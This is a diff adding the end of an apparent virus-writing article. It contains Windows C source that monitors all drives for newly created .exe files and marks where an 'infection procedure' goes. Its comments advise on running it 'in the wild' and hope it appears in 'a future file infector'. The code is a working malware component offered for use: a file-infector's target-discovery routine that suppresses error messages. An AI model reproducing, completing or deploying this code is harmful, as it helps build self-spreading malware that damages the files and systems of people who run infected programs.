+#define	WIN32_LEAN_AND_MEAN
+#include <windows.h>
+
+#define	FNI		FILE_NOTIFY_INFORMATION
+#define	MAX_THREADS	26	// a-z
+#define	SECOND		1000	// milliseconds
+#define	MINUTE		SECOND * 60
+#define	voidW		void	WINAPI
+
+	// procedures we'll be needing
+void	WINAPI	watchDrive(DWORD);
+int	findNewThread(void);
+HANDLE	newThread(LPTHREAD_START_ROUTINE, LPVOID);
+
+	// this structure allows us to pass multiple values to a thread
+typedef	struct {
+	char	szDrive[8];
+	BOOL	bActive;
+}PARAMS;
+
+PARAMS	pParams[MAX_THREADS];	// create 26 seperate ptrs to this struct
+
+int	main(void){
+	char	*drive;
+	DWORD	dwDriveType = 0;
+	int	index = 0;
+	BOOL	bActiveDrive;
+
+	SetErrorMode(1);	// hide error messages [big thanks to izee]
+
+	for(index = 0; index < MAX_THREADS; index++)
+		pParams[index].bActive = FALSE;
+
+	drive = (char *) malloc(8);
+	memset(drive, 0, 8);
+	strcpy(drive + 1, ":\\");	// drive = '_:\' where '_' will hold 'a' through 'z'
+
+	while(1){
+		for(drive[0] = 97; drive[0] < 122; drive[0]++){	// for a-z
+			bActiveDrive = FALSE;	// we assume this drive is not being watched
+			for(index = 0; index < MAX_THREADS; index++){	// loop through each thread
+				if(drive[0] == pParams[index].szDrive[0]){	// if _ matches our current drive (_:\)
+					bActiveDrive = TRUE;
+					printf("drive %s already being watched!\n", drive);
+					break;	// exit loop (we got the info we needed)
+				}
+			}
+
+			index = findNewThread();	// find free thread
+			if(index == -1)	// if no threads are free...
+				break;	// exit loop because we're already watching all possible drives
+
+
+			if(bActiveDrive == FALSE){	// if there is not a free thread
+				switch(GetDriveType(drive)){	// check drive type
+					case	2:	// if fixed, removable or remote
+					case	3:
+					case	4:
+						strcpy(pParams[index].szDrive, drive);
+						pParams[index].bActive = TRUE;	// set thread's active flag
+						newThread(&watchDrive, (DWORD *) index);
+							/* create thread and point to pParams[]
+							 * with current index
+							 */
+						break;
+					default:	// wrong drive type? do nothing
+						break;
+				}
+			}
+		}
+
+		Sleep(MINUTE);	/* sleep for awhile (for testing, i used
+				 * a minute; i'd suggest at least 5 minutes
+				 * in the wild)
+				 */
+	}
+}
+
+voidW	watchDrive(DWORD index){
+	char	*buffer;
+	char	*szFilename;
+	char	*szFullFile;
+	char	*szExt;
+	char	*pExt;
+	int	i = 0;
+	HANDLE	hDir;
+	FNI	*pFNI;
+	int	errors = 0;
+
+	printf("watching %s...\n", pParams[index].szDrive);
+
+		// malloc some space for our buffers
+	buffer = (char *) malloc(1024);
+	szFilename = (char *) malloc(56);
+	szFullFile = (char *) malloc(256);
+	szExt = (char *) malloc(4);
+
+		// set buffers to zero
+	memset(buffer, 0, 1024);
+	memset(szFilename, 0, 56);
+	memset(szFullFile, 0, 256);
+	memset(szExt, 0, 4);
+
+		// open drive with file watch access
+	hDir = CreateFile(pParams[index].szDrive, 1, 5, 0, 3, 0x2000000, 0);
+	if(hDir == -1)
+		ExitThread(0);
+
+		// loop infinitely
+	while(1){
+			// read changes
+		i = ReadDirectoryChangesW(hDir, buffer, 1022, 1, 0x017, (DWORD *) &i, 0, 0);
+		if(i == 0){	// error?
+			errors++;
+			if(errors > 5){	// if we've experianced more than 5 errors ...
+				memset(pParams[index].szDrive, 0, 8);	// delete thread's flags
+				pParams[index].bActive = FALSE;
+				ExitThread(0);	// exit thread
+				/* note: this error-checking is not fool proof.  my
+				 * idea behind it was: if we experiance more than 5
+				 * errors, the drive must not be accessable.  however,
+				 * this is not all ways true.  worst case senerio, we
+				 * exit and re-create a thread for this drive.
+				 */
+			}
+			continue;
+		}
+
+			// create file notify info pointer out of buffer
+		for(pFNI = (FNI *)buffer;;){
+				// file_notify_create = 1
+			if(pFNI->Action == 1){
+					// create readable string
+				i = WideCharToMultiByte(0, 0, pFNI->FileName, pFNI->FileNameLength / 2, 
+					szFilename, 255, 0, 0);
+				szFilename[i] = 0;
+				CharLower(szFilename);
+
+					// extract file extension
+				pExt = szFilename + i - 3;
+				strncpy(szExt, pExt, 3);
+
+					// fullfile = drive + filename
+				sprintf(szFullFile, "%s%s", pParams[index].szDrive, szFilename);
+
+					// disregard file if created in recycling bin
+				if(strstr(szFilename, "recycle"))
+					continue;
+
+					// check for exe extension
+				if(!strcmp(szExt, "exe")){
+					printf("%s\n", szFullFile);
+					/* your infection procedure here */
+				}
+			}
+				// check for next offset in file notify info structure
+			if(!pFNI->NextEntryOffset)
+				break;
+				// create pointer to next offset
+			pFNI = (FNI *) (((char *) pFNI) + pFNI->NextEntryOffset);
+		}
+	}
+}
+
+int	findNewThread(void){
+	int	i = 0;
+	for(i = 0; i < MAX_THREADS; i++){	/* loop through all threads
+						 * to find a non-active thread
+						 */
+		if(pParams[i].bActive == FALSE)
+			return	i;
+	}
+	return	-1;
+}
+
+	// procedure idea ripped from dr-ef's ircworm (saves your fingers!)
+HANDLE	newThread(LPTHREAD_START_ROUTINE procedure, LPVOID lpParams){
+	DWORD	dwThreadID;
+	return	CreateThread(0, 0, procedure, lpParams, 0, &dwThreadID);
+}
+ - [ code ] – - -
+
+        simple  enough, huh?  perhaps i'll see  this  method used  in a
+    future  file infector . . . perhaps not.  either way, i hope you've
+    enjoyed this little article.
+
+
+                                         idea: 67.3.3175
+                                              today: 30.4.3175
+                                                   kefi23@gmail.com
+                                                        www.kefivx.info
+
+ [*]       http://msdn.microsoft.com/en-us/library/aa365465(VS.85).aspx
+ [**]      very special thanks to izee for beta-reading :)
